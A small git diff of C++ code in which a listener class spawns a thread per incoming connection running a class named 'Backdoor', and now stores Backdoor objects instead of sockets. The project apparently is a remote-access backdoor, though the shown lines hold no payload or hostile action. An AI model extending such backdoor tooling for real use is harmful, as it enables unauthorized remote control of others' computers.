@@ -94,8 +94,9 @@ void Communication::listen_forever(){
         char * client_ip = inet_ntoa(address.sin_addr);
         int port = ntohs(address.sin_port);
 
-        this->threads.push_back(std::thread(Backdoor(new_socket, this, true, client_ip)));
-        this->sockets.push_back(new_socket);
+        Backdoor b(new_socket, this, true, client_ip);
+        this->threads.push_back(std::thread(b));
+        this->backdoors.push_back(b);
     }
 
     for (auto &t : this->threads){
@@ -125,8 +126,8 @@ void Communication::send_message(int sock, const char * message){
 }
 
 
-std::vector<int> Communication::get_sockets(){
-    return this->sockets;
+std::vector<Backdoor> Communication::get_backdoors(){
+    return this->backdoors;
 }
 
 
